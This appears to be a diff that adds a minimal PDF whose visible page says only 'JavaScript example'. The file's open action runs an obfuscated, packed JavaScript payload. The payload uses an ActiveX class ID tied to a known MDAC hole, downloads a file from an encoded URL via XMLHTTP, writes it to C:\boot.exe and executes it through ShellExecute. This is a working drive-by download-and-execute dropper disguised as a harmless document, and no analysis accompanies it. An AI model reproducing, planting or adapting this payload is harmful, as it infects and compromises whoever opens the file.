@@ -1,0 +1,85 @@
+%PDF-1.1
+
+1 0 obj
+<<
+ /Type /Catalog
+ /Outlines 2 0 R
+ /Pages 3 0 R
+ /OpenAction 7 0 R
+>>
+endobj
+
+2 0 obj
+<<
+ /Type /Outlines
+ /Count 0
+>>
+endobj
+
+3 0 obj
+<<
+ /Type /Pages
+ /Kids [4 0 R]
+ /Count 1
+>>
+endobj
+
+4 0 obj
+<<
+ /Type /Page
+ /Parent 3 0 R
+ /MediaBox [0 0 612 792]
+ /Contents 5 0 R
+ /Resources <<
+             /ProcSet [/PDF /Text]
+             /Font << /F1 6 0 R >>
+            >>
+>>
+endobj
+
+5 0 obj
+<< /Length 56 >>
+stream
+BT /F1 12 Tf 100 700 Td 15 TL (JavaScript example) Tj ET
+endstream
+endobj
+
+6 0 obj
+<<
+ /Type /Font
+ /Subtype /Type1
+ /Name /F1
+ /BaseFont /Helvetica
+ /Encoding /MacRomanEncoding
+>>
+endobj
+
+7 0 obj
+<<
+ /Type /Action
+ /S /JavaScript
+ /JS (<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 9,8;9="D://%6%6%6%a%6%K%L%11%X%I%v%a%Y%A%z/y.c";8="C:\\\\B.c";G{3 5=(F.E("w"));3 d=1;5.p("o","q:m-r-u-t-s");3 e=1;3 7=5.H("12.W","");3 f=1;3 b="V.";3 i="U";3 g=1;3 4=5.k(b+i,"");3 h=1;7.10("Z",9,0);7.S();4.M=1;3 n=1;4.j();4.J(7.N);4.O(8,2);4.P();3 l=5.k("Q.R","");l.T(8,"","","j",0)}x(e){};',62,65,'|||var|as|ado|77|xml|path|url|2E|ab|exe||||||cd|open|createobject|shell|BD96C556||classid|setAttribute|clsid|65A3|00C04FC29E36|983A|11D0|79|object|catch|sys|6D|6F|boot||http|createElement|document|try|CreateObject|61|write|69|6E|type|responseBody|savetofile|close|Shell|Application|Send|ShellExecute|Stream|Adodb|XMLHTTP|64|63|GET|Open|30|Microsoft'.split('|'),0,{}))
+</script>
+
+)
+>>
+endobj
+
+xref
+0 8
+0000000000 65535 f 
+0000000010 00000 n 
+0000000098 00000 n 
+0000000147 00000 n 
+0000000208 00000 n 
+0000000400 00000 n 
+0000000507 00000 n 
+0000000621 00000 n 
+trailer
+<<
+ /Size 8
+ /Root 1 0 R
+>>
+startxref
+1703
+%%EOF
